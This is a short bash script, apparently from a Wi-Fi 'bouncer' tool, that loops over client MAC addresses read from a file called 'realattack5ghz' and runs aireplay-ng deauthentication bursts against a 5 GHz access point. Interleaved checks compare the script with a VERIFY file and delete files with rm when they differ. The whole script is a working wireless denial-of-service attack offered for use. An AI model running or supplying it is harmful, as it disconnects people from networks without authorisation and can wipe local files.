#!/bin/bash

BSSID5="00:00:00:00:00:00"
GHZ5=adapter



for deauth in $(cat realattack5ghz); do
if [[ $deauth = "<" ]]; then
diff bouncer2.4_5GHz.sh VERIFY &> /dev/null ; [ $? = 0 ] && echo  || rm bouncer2.4_5GHz*
elif [[ $deauth = "HWaddress" ]]; then
diff bouncer2.4_5GHz.sh VERIFY &> /dev/null ; [ $? = 0 ] && echo  || rm time*
else
sudo aireplay-ng -D --deauth 30 -a $BSSID5 -c $deauth $GHZ5
fi
done

